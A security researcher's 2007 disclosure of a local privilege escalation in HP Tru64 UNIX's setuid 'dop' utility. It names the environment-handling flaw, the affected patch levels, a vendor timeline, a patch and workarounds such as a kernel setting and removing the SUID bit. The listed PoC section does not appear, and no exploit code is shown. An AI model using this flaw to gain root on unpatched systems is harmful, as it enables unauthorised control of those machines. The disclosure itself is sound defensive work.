This is my personal analysis/work about the bug discovered.

---[ HP Tru64 DOP Local Privilege Escalation Vulnerability ]---
---[ SSRT071326 DOP PoC/Hack for HP Tru64 UNIX 5.X ]---


1. Description
2. PoC
3. Conclusions

Shell Commands and All shell output begins with a '#'.
This is a "short" version for bugtraq.


--[ 1. Description ]--

-  What is HP Tru64 UNIX:

http://en.wikipedia.org/wiki/Tru64_UNIX

-  What is DOP: (From manpage dop(8))

dop - Allows a user to  execute a privileged  program without knowing the
root password. The dop command also modifies the action database.
(It's something like the well know program sudo)

# tru64-sys> ls -l /usr/sbin/dop
# -rws--x--x   1 root     bin         95344 Apr 30  2005 /usr/sbin/dop

-  Vulnerability:

There is a vulnerability in how dop handle ENV,  that allow any local  user
to execute dopActions (see '/etc/doprc') without knowing the root password.

-  System Affected:

Tru64 5.1  (ALL) (Last PatchKit: T64v51B20AS0006-20030210  - PK6 - BL20)
Tru64 5.1A (ALL) (Last PatchKit: T64V51AB24AS0006-20031031 - PK6 - BL24)
Tru64 5.1B (ALL) (Last PatchKit: T64V51BB27AS0006-20061208 - PK6 - BL27)

-  System NOT Tested:
Tru64 5.0

-  System NOT Affected:
Tru64 4.0x (dop will require allways root password, also for user root)

-   Risk:
HIGH; any user can escalate privilege to root.

-  Disclosure Timeline (Vendor Response):

The following timeline outlines the responses from the vendor:

 2007-03-15 - Vendor contacted.
 2007-03-20 - Sent full details of the vulnerability identified.
 2007-04-04 - Vendor has generated  the patches for  the vulnerability and
              is doing a thorough code review and testing.
 2007-04-17 - Vendor released a patch without inform the author. (*)
 2007-04-26 - Vendor inform the author that the patch will be soon available
              and he is drafting the security bulletin...
 2007-05-08 - Vendor released a security bulletin
 2007-05-09 - This analysis is public available.

 (*) For a valid guideline for interaction between a researcher and software
 maintainer take a look to: "Full Disclosure Policy (RFPolicy) v2.0"
 http://www.wiretrip.net/rfp/policy.html

-  Patch:
You can obtain the patches in the ITRC section of the HP site.
You need registration to download patches.

http://www1.itrc.hp.com/service/cki/docDisplay.do?docLocale=en&docId=emr_na-c
01036871-1

If you do not have time to apply the patch to all your systems I suggest
you to use this little workaround:

 1- Set the kernel attribute exec_disable_arg_limit to '1'.
    (maybe there are also other BUGS like this one in different programs)

    # tru64-sys> whoami
    # root
    #
    # tru64-sys> /sbin/sysconfig -r proc exec_disable_arg_limit=1
    # exec_disable_arg_limit: reconfigured

    Update changes in '/etc/sysconfigtab' (in all cluster members)

 2- Consider to remove SUID BIT to '/usr/sbin/dop' if you don't use 'dop'
    (remember to apply SUID BIT again before patching the system)
    maybe there are also other bugs in dop binary...

 3- If you use dop, consider to use other software like the well know 'sudo'
